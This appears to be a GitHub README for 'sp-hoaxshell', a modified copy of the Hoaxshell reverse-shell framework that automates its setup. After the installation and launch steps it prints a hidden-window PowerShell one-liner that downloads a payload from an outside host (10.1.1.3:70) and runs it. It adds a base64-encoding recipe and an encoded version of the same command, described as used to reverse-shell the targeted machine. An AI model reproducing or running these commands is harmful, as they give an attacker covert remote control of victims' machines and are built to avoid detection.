<img src="https://github.com/SentinelSamuel/sp-winget-RS-hoax/blob/main/img-for-Readme/Hoax.png" width="500">

# sp-hoaxshell

Copy of the real Hoaxshell (https://github.com/t3l3machus/hoaxshell) with modifications to automatise everything
& see : https://github.com/SentinelSamuel/sp-hoaxshell

## Installation + configuration before the start
```
sudo git clone https://github.com/t3l3machus/hoaxshell.git
sudo rm ./hoaxshell/hoaxshell.py
sudo git clone https://github.com/SentinelSamuel/sp-hoaxshell.git
sudo mv ./sp-hoaxshell/hoaxshell.py ./hoaxshell
sudo mv ./sp-hoaxshell/sp-hoax/ ./
sudo rm -rf ./sp-hoaxshell
sudo pip3 install -r ./hoaxshell/requirements.txt
sudo chmod +x ./hoaxshell/hoaxshell.py
cd sp-hoax/
```

### 1) Start Python server
```
# maybe a sudo before ?
bash python-server-1.sh
```
<img src="https://github.com/SentinelSamuel/sp-winget-RS-hoax/blob/main/img-for-Readme/Picture2.png" width="500">

### 2) Start hoaxshell
```
# IN ANOTHER BASH PROMPT
# maybe a sudo before ?
bash hoaxshell-2.sh  
```
<img src="https://github.com/SentinelSamuel/sp-winget-RS-hoax/blob/main/img-for-Readme/Picture3.png" width="500">

### 3) Make the info file correct
```
# IN ANOTHER BASH PROMPT
# maybe a sudo before ?
pwsh info-3.ps1
```
<img src="https://github.com/SentinelSamuel/sp-winget-RS-hoax/blob/main/img-for-Readme/Picture4.png" width="500">

## Some infos :
```
# Not encoded :
$e=Invoke-RestMethod -Uri "http://10.1.1.3:70/sp-hoax/info"; powershell -WindowStyle hidden -e $e
```
```
# Encoded with this :
$text='<Your commands>'
$encoded=[convert]::ToBase64String([Text.Encoding]::Unicode.getBytes($text))
$encoded
```
```
# Encoded & used in the scripts to reverse-shell the targeted machine
powershell -WindowStyle hidden -e "JABlAD0ASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADAALgAxAC4AMQAuADMAOgA3ADAALwBzAHAALQBoAG8AYQB4AC8AaQBuAGYAbwAiADsAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABoAGkAZABkAGUAbgAgAC0AZQAgACQAZQA="
```
<img src="https://github.com/SentinelSamuel/sp-winget-RS-hoax/blob/main/img-for-Readme/Picture5.png" width="500">
